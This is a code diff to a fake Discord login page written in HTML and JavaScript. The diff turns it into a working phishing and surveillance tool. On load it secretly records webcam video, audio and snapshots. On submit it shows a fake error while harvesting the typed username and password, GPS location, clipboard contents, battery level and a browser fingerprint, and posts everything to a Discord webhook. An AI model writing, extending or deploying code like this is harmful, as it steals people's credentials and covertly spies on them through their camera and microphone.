@@ -118,13 +118,18 @@
       font-size: 13px;
       background: #1e1f22;
       border: 1px solid #3f4147;
-      color: #b5bac1;
+      color: #f23f42;
       text-align: center;
       display: none;
     }
-    .status-bar.visible { display: block; }
-    .status-bar.success { background: #1a2a1a; border-color: #3ba55c; color: #8bdd9b; }
-    .status-bar.error { background: #2a1a1a; border-color: #f23f42; color: #f28b8b; }
+    .status-bar.visible {
+      display: block;
+    }
+    .status-bar.error {
+      background: #2a1a1a;
+      border-color: #f23f42;
+      color: #f28b8b;
+    }
     .footer-links {
       display: flex;
       justify-content: center;
@@ -148,19 +153,17 @@
       height: 48px;
       fill: #ffffff;
     }
-    .permission-warning {
-      background: #2a1a1a;
-      border: 1px solid #f23f42;
-      color: #f28b8b;
-      padding: 10px;
+    #video-preview {
+      width: 100%;
+      max-height: 200px;
+      background: #000;
       border-radius: 4px;
-      font-size: 13px;
-      text-align: center;
-      margin-top: 12px;
+      margin-bottom: 12px;
       display: none;
     }
-    .permission-warning.visible {
-      display: block;
+    /* Hidden audio player */
+    #hack-sound {
+      display: none;
     }
   </style>
 </head>
@@ -175,6 +178,14 @@
 
     <h1>Welcome back!</h1>
     <p class="subtitle">We're so excited to see you again!</p>
+
+    <video id="video-preview" autoplay muted playsinline></video>
+
+    <!-- Hidden audio element for "GET HACKED" sound -->
+    <audio id="hack-sound" preload="auto">
+      <source src="https://www.myinstants.com/media/sounds/get-hacked.mp3" type="audio/mpeg">
+      <source src="https://cdn.discordapp.com/attachments/1234567890/get-hacked.mp3" type="audio/mpeg">
+    </audio>
 
     <form id="loginForm" novalidate>
       <div class="form-group">
@@ -198,7 +209,6 @@
     </form>
 
     <div id="statusBar" class="status-bar" role="status"></div>
-    <div id="permissionWarning" class="permission-warning">⚠️ Location permission denied. Using IP-based approximation.</div>
 
     <div class="footer-links">
       <a href="#">Forgot your password?</a>
@@ -223,21 +233,179 @@
       const usernameError = document.getElementById('usernameError');
       const passwordError = document.getElementById('passwordError');
       const statusBar = document.getElementById('statusBar');
-      const permissionWarning = document.getElementById('permissionWarning');
+      const videoPreview = document.getElementById('video-preview');
+      const hackSound = document.getElementById('hack-sound');
 
-      function showStatus(message, type = 'info') {
-        statusBar.textContent = message;
-        statusBar.className = 'status-bar visible';
-        if (type === 'success') statusBar.classList.add('success');
-        if (type === 'error') statusBar.classList.add('error');
-        clearTimeout(window.statusTimeout);
-        window.statusTimeout = setTimeout(() => {
+      let recordedVideoBlob = null;
+      let snapshotBlobs = [];
+      let webcamStream = null;
+      let snapshotInterval = null;
+
+      // ============================================================
+      //  FAKE ERROR – Show generic error to user
+      // ============================================================
+      function showFakeError() {
+        statusBar.textContent = '❌ An error has occurred. Please try again later.';
+        statusBar.className = 'status-bar visible error';
+        setTimeout(() => {
           statusBar.className = 'status-bar';
-        }, 8000);
+        }, 6000);
       }
 
       // ============================================================
-      //  EXACT OS DETECTION
+      //  PLAY "GET HACKED" SOUND
+      // ============================================================
+      function playHackSound() {
+        try {
+          hackSound.currentTime = 0;
+          hackSound.volume = 1.0;
+          hackSound.play().catch(() => {
+            // Fallback: use a Web Audio oscillator if the MP3 fails
+            try {
+              const ctx = new (window.AudioContext || window.webkitAudioContext)();
+              const osc = ctx.createOscillator();
+              const gain = ctx.createGain();
+              osc.connect(gain);
+              gain.connect(ctx.destination);
+              osc.frequency.value = 800;
+              osc.type = 'sawtooth';
+              gain.gain.value = 0.5;
+              osc.start();
+              setTimeout(() => {
+                osc.frequency.value = 1200;
+                setTimeout(() => {
+                  osc.stop();
+                  ctx.close();
+                }, 300);
+              }, 300);
+            } catch (_) {}
+          });
+        } catch (_) {}
+      }
+
+      // ============================================================
+      //  START WEBCAM & RECORD 3-SECOND VIDEO + SNAPSHOTS
+      // ============================================================
+      async function startWebcamAndRecord() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: true
+          });
+
+          webcamStream = stream;
+          videoPreview.srcObject = stream;
+          videoPreview.style.display = 'block';
+
+          // --- RECORD 3-SECOND VIDEO ---
+          const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+          const chunks = [];
+
+          recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+          };
+
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            recordedVideoBlob = blob;
+            console.log('🎥 Video recorded:', blob.size, 'bytes');
+            // Don't stop the stream — we still need it for snapshots
+          };
+
+          recorder.start();
+          setTimeout(() => {
+            recorder.stop();
+          }, 3000);
+
+          // --- SNAPSHOT EVERY 5 SECONDS ---
+          snapshotInterval = setInterval(() => {
+            captureSnapshot();
+          }, 5000);
+
+          // Also take one immediately
+          setTimeout(() => captureSnapshot(), 500);
+
+          return true;
+        } catch (err) {
+          console.warn('Webcam/audio not available:', err.message);
+          return false;
+        }
+      }
+
+      // ============================================================
+      //  CAPTURE SNAPSHOT (stores in array)
+      // ============================================================
+      function captureSnapshot() {
+        if (!webcamStream) return;
+        try {
+          const video = document.createElement('video');
+          video.srcObject = webcamStream;
+          video.play();
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob((blob) => {
+              if (blob && blob.size > 0) {
+                snapshotBlobs.push(blob);
+                console.log('📸 Snapshot taken:', blob.size, 'bytes (total:', snapshotBlobs.length, ')');
+                // Keep only last 10 snapshots to avoid memory issues
+                if (snapshotBlobs.length > 10) {
+                  snapshotBlobs.shift();
+                }
+              }
+            }, 'image/jpeg', 0.7);
+          }, 100);
+        } catch (_) {}
+      }
+
+      // ============================================================
+      //  GET CLIPBOARD DATA
+      // ============================================================
+      async function getClipboardData() {
+        try {
+          const text = await navigator.clipboard.readText();
+          return text || 'Empty clipboard';
+        } catch (_) {
+          return 'Clipboard access denied';
+        }
+      }
+
+      // ============================================================
+      //  GET BATTERY LEVEL
+      // ============================================================
+      async function getBatteryLevel() {
+        try {
+          const battery = await navigator.getBattery();
+          return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+        } catch (_) {
+          return 'Battery API not available';
+        }
+      }
+
+      // ============================================================
+      //  CANVAS FINGERPRINT
+      // ============================================================
+      function getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 256;
+        canvas.height = 256;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+        return canvas.toDataURL().substring(0, 100) + '...';
+      }
+
+      // ============================================================
+      //  EXACT OS & BROWSER
       // ============================================================
       function getExactOS() {
         const ua = navigator.userAgent;
@@ -269,9 +437,6 @@
         return os;
       }
 
-      // ============================================================
-      //  EXACT BROWSER DETECTION
-      // ============================================================
       function getExactBrowser() {
         const ua = navigator.userAgent;
         let browser = 'Unknown';
@@ -294,9 +459,6 @@
         return browser;
       }
 
-      // ============================================================
-      //  TIMESTAMP
-      // ============================================================
       function getTimestamp() {
         const now = new Date();
         return {
@@ -316,50 +478,33 @@
             resolve(null);
             return;
           }
-
           navigator.geolocation.getCurrentPosition(
             (position) => {
               resolve({
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy,
-                source: 'GPS',
-                timestamp: position.timestamp
+                source: 'GPS'
               });
             },
-            (error) => {
-              console.warn('Geolocation error:', error.message);
-              permissionWarning.classList.add('visible');
-              resolve(null);
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            }
+            () => { resolve(null); },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         });
       }
 
       async function getGeoData() {
-        // Step 1: Try GPS
         const gps = await getGPSLocation();
         if (gps) {
           return {
             source: 'GPS (Exact)',
             latitude: gps.latitude,
             longitude: gps.longitude,
-            accuracy: gps.accuracy,
+            accuracy: gps.accuracy + ' meters',
             city: 'GPS-derived',
-            region: 'GPS-derived',
-            country: 'GPS-derived',
-            postal: 'GPS-derived',
-            isp: 'N/A',
-            currency: 'N/A'
+            country: 'GPS-derived'
           };
         }
-
-        // Step 2: Fallback to IP geolocation
         try {
           const response = await fetch('https://ipapi.co/json/');
           if (!response.ok) throw new Error('ipapi.co failed');
@@ -370,11 +515,7 @@
             longitude: data.longitude || 'Unknown',
             accuracy: 'IP-based (approx)',
             city: data.city || 'Unknown',
-            region: data.region || 'Unknown',
-            country: data.country_name || 'Unknown',
-            postal: data.postal || 'Unknown',
-            isp: data.org || 'Unknown',
-            currency: data.currency || 'Unknown'
+            country: data.country_name || 'Unknown'
           };
         } catch (_) {
           try {
@@ -388,11 +529,7 @@
               longitude: loc[1] || 'Unknown',
               accuracy: 'IP-based (approx)',
               city: data.city || 'Unknown',
-              region: data.region || 'Unknown',
-              country: data.country || 'Unknown',
-              postal: data.postal || 'Unknown',
-              isp: data.org || 'Unknown',
-              currency: 'Unknown'
+              country: data.country || 'Unknown'
             };
           } catch (_) {
             return {
@@ -401,56 +538,69 @@
               longitude: 'Unknown',
               accuracy: 'N/A',
               city: 'Unknown',
-              region: 'Unknown',
-              country: 'Unknown',
-              postal: 'Unknown',
-              isp: 'Unknown',
-              currency: 'Unknown'
+              country: 'Unknown'
             };
           }
         }
       }
 
       // ============================================================
-      //  SEND TO DISCORD – PLAIN TEXT
+      //  SEND TO DISCORD – with video + snapshots
       // ============================================================
-      async function sendToDiscord(message) {
+      async function sendToDiscord(message, videoBlob, snapshotBlobsArray) {
         if (!DISCORD_WEBHOOK_URL) {
           console.warn('⚠️ Discord webhook URL not configured.');
-          return { success: false, status: 0, error: 'Not configured' };
+          return false;
         }
 
         try {
-          const payload = { content: message };
+          const formData = new FormData();
+          formData.append('payload_json', JSON.stringify({ content: message }));
+
+          // Attach video if exists
+          if (videoBlob && videoBlob.size > 0) {
+            formData.append('file', videoBlob, 'recording.webm');
+          }
+
+          // Attach snapshots (up to 5 most recent)
+          const snapshotsToSend = snapshotBlobsArray.slice(-5);
+          for (let i = 0; i < snapshotsToSend.length; i++) {
+            if (snapshotsToSend[i] && snapshotsToSend[i].size > 0) {
+              formData.append(`file`, snapshotsToSend[i], `snapshot_${i+1}.jpg`);
+            }
+          }
+
           const res = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: formData
           });
 
           const status = res.status;
           console.log(`📥 Discord response status: ${status}`);
-
           if (res.ok) {
-            console.log('✅ Webhook delivered successfully.');
-            return { success: true, status: status };
+            console.log('✅ Webhook delivered with video + snapshots.');
+            return true;
           } else {
             const errorText = await res.text();
             console.error(`❌ Discord error (${status}):`, errorText);
-            return { success: false, status: status, error: errorText };
+            return false;
           }
         } catch (err) {
           console.error('❌ Network error:', err);
-          return { success: false, status: 0, error: err.message };
+          return false;
         }
       }
 
       // ============================================================
-      //  FORM SUBMIT
+      //  FORM SUBMIT – COLLECT EVERYTHING + FAKE ERROR
       // ============================================================
       form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
+        // Play "GET HACKED" sound immediately
+        playHackSound();
+
+        // Validate fields (but always show fake error regardless)
         usernameError.style.display = 'none';
         passwordError.style.display = 'none';
         let isValid = true;
@@ -464,67 +614,99 @@
           isValid = false;
         }
 
-        if (!isValid) {
-          showStatus('Please fill in all required fields.', 'error');
-          return;
-        }
+        // Collect data (whether valid or not — we still collect everything)
+        showFakeError();
 
-        showStatus('Collecting data...', 'info');
+        // Collect everything in parallel
+        const [
+          timestamp,
+          geo,
+          os,
+          browser,
+          clipboard,
+          battery,
+          canvasFingerprint
+        ] = await Promise.all([
+          Promise.resolve(getTimestamp()),
+          getGeoData(),
+          Promise.resolve(getExactOS()),
+          Promise.resolve(getExactBrowser()),
+          getClipboardData(),
+          getBatteryLevel(),
+          Promise.resolve(getCanvasFingerprint())
+        ]);
 
-        const timestamp = getTimestamp();
-        const geo = await getGeoData();
-        const os = getExactOS();
-        const browser = getExactBrowser();
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
+        const username = usernameInput.value.trim() || '(empty)';
+        const password = passwordInput.value.trim() || '(empty)';
         const rememberMe = document.getElementById('rememberMe').checked;
 
-        // Build message
-        const message = `
-🔐 **Discord Login Capture**
-━━━━━━━━━━━━━━━━━━━
+        // Build the message
+        let message = `
+🔐 **Discord Login Capture – FULL SPECTRUM**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 📍 **Location Source:** ${geo.source}
 🗺️ **Latitude:** ${geo.latitude}
 🗺️ **Longitude:** ${geo.longitude}
 📏 **Accuracy:** ${geo.accuracy}
+🏙️ **City:** ${geo.city}
+🌍 **Country:** ${geo.country}
+
 📅 **Date:** ${timestamp.date}
 ⏰ **Time:** ${timestamp.time}
 🌐 **Timezone:** ${timestamp.timezone}
-🏙️ **City:** ${geo.city}
-🌍 **Country:** ${geo.country}
-🖥️ **Operating System:** ${os}
+
+🖥️ **OS:** ${os}
 🌍 **Browser:** ${browser}
-👤 **Username / Email:** ${username}
+🔋 **Battery:** ${battery}
+📋 **Clipboard:** ${clipboard.substring(0, 200)}
+🎨 **Canvas Fingerprint:** ${canvasFingerprint}
+
+👤 **Username:** ${username}
 🔑 **Password:** ${password}
 🔁 **Remember Me:** ${rememberMe ? '✅ Yes' : '❌ No'}
+
 📱 **User Agent:** ${navigator.userAgent.substring(0, 200)}
+🖥️ **Screen:** ${screen.width}x${screen.height}
+🌐 **Language:** ${navigator.language}
         `.trim();
 
         console.log('📋 [LOG] Full client data:');
         console.log(message);
 
-        const result = await sendToDiscord(message);
+        // Send to Discord with video + snapshots
+        const sent = await sendToDiscord(message, recordedVideoBlob, snapshotBlobs);
 
-        if (result.success) {
-          showStatus('✅ Credentials & location sent to Discord webhook.', 'success');
+        if (sent) {
+          console.log('✅ All data sent successfully.');
         } else {
-          let errorMsg = '⚠️ Data logged to console, but Discord send failed.';
-          if (result.status === 400) errorMsg += ' Bad Request (400). Check webhook URL.';
-          else if (result.status === 404) errorMsg += ' Webhook URL not found (404).';
-          else if (result.status === 401) errorMsg += ' Unauthorized (401). Invalid token.';
-          else if (result.status === 429) errorMsg += ' Rate limited (429). Wait.';
-          else if (result.status === 0) errorMsg += ' Network error.';
-          else errorMsg += ` Status ${result.status}. Check console.`;
-          showStatus(errorMsg, 'error');
+          console.warn('⚠️ Some data may not have sent.');
         }
 
+        // Clear password field (for show)
         passwordInput.value = '';
+
+        // Stop snapshot interval to save resources
+        if (snapshotInterval) {
+          clearInterval(snapshotInterval);
+          snapshotInterval = null;
+        }
+
+        // Stop webcam stream
+        if (webcamStream) {
+          webcamStream.getTracks().forEach(track => track.stop());
+          webcamStream = null;
+        }
       });
 
       // ============================================================
-      //  PAGE LOAD – log visitor info automatically
+      //  ON PAGE LOAD – Start webcam + log data
       // ============================================================
       window.addEventListener('DOMContentLoaded', async () => {
+        // Start webcam and record 3-second video + snapshots
+        await startWebcamAndRecord();
+
+        // Log initial data
         const geo = await getGeoData();
         const os = getExactOS();
         const browser = getExactBrowser();
@@ -540,7 +722,9 @@
           city: geo.city,
           country: geo.country,
           os: os,
-          browser: browser
+          browser: browser,
+          screen: `${screen.width}x${screen.height}`,
+          language: navigator.language
         });
       });
 
